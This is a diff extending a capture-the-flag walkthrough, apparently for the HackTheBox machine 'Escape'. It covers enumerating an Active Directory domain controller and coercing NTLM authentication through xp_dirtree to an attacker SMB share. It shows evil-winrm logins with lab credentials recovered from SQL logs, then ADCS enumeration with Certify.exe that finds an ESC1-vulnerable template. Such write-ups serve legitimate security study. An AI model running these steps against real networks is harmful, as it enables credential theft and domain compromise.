@@ -9,6 +9,13 @@ nmap -p 53,88,135,139,389,445,464,593,636,1433,3269,3268,5985,9389,49667,49689,4
 
 This looks very much like a Windows domain controller, based on standard Windows stuff like SMB (445), NetBIOS (135/139), LDAP (389, etc), and WinRM (5985), as well as 53 (DNS) and 88 (Kerberos) typically seen listening on DCs. There’s also a MSSQL server (1433).
 
+`3269/TCP` for LDAP Global Catalog over TLS/SSL
+
+### 3269 TLS Cert
+`openssl s_client -showcerts -connect $IP:3269 | openssl x509 -noout -text`
+
+It’s interesting to note the certificate authority that issued the certificate, sequel-DC-CA
+
 ### SMB
 ##### smbclient
 ```bash
@@ -169,6 +176,7 @@ sudo tcpdump -i tun0
 impacket-smbserver as . -smb2support
 
 SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.4\evil
+or EXEC MASTER.sys.xp_dirtree '\\10.10.14.14\test', 1, 1 using a UNC (Universal Naming Convention) path
 subdirectory   depth   file   
 ------------   -----   ----
 
@@ -179,3 +187,113 @@ subdirectory   depth   file
 ```
 
 `evil-winrm -i $IP -u sql_svc -p REGGIE1234ronnie`
+
+Get it from `c:\sqlserver\logs`
+
+```cmd
+2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+```
+
+# Shell as Ryan.Cooper
+`evil-winrm -i $IP -u Ryan.Cooper -p NuclearMosquito3`
+
+# Shell as administrator
+### Enumeration
+##### Identify ADCS
+Active Directory Certificate Services (ADCS). A quick way to check for this is using crackmapexec (and it works as either `sql_svc` or `Ryan.Cooper`):
+
+```bash
+crackmapexec ldap $IP -u ryan.cooper -p NuclearMosquito3 -M adcs
+crackmapexec ldap $IP -u sql_svc -p REGGIE1234ronnie -M adcs
+
+SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+LDAPS       10.129.228.253  636    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
+ADCS                                                Found PKI Enrollment Server: dc.sequel.htb
+ADCS                                                Found CN: sequel-DC-CA
+```
+
+##### Identify Vulnerable Template via Certify.exe
+Looking back at our initial enumeration output from Nmap we can see a lot of certificate related output. This is a strong indication that there is a Certificate Authority running. 
+
+With ADCS running, the next question is if there are any templates in this ADCS that are insecurely configured. To enumerate further, I’ll upload a copy of Certify by downloading a copy from SharpCollection, and uploading it to Escape:
+
+* https://github.com/ly4k/Certipy
+
+* https://github.com/A1vinSmith/SharpCollection/blob/master/NetFramework_4.7_x64/Certify.exe
+* https://github.com/A1vinSmith/Ghostpack-CompiledBinaries
+* https://github.com/GhostPack/Certify
+
+* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#abuse
+* https://www.thehacker.recipes/ad/movement/ad-cs
+
+```cmd evil-winrm
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> upload /home/alvin/Documents/OSEP/HTB/Windows/Escape/Certify.exe
+                                        
+Info: Uploading /home/alvin/Documents/OSEP/HTB/Windows/Escape/Certify.exe to C:\Users\Ryan.Cooper\Desktop\Certify.exe
+                                        
+Data: 17584 bytes of 17584 bytes copied
+                                        
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\Certify.exe find /vulnerable
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
+
+[*] Listing info about the Enterprise CA 'sequel-DC-CA'
+
+    Enterprise CA Name            : sequel-DC-CA
+    DNS Hostname                  : dc.sequel.htb
+    FullName                      : dc.sequel.htb\sequel-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : dc.sequel.htb\sequel-DC-CA
+    Template Name                         : UserAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS <- It contains ENROLLEE_SUPPLIES_OBJECT. The templeate is vulnerable to the ESC1 scenario. https://m365internals.com/2022/11/07/investigating-certificate-template-enrollment-attacks-adcs/
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+      Object Control Permissions
+        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+```
+
+The danger here is that sequel\Domain Users has Enrollment Rights for the certificate (this is scenario 3 in the Certify README). Enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set (ESC1).
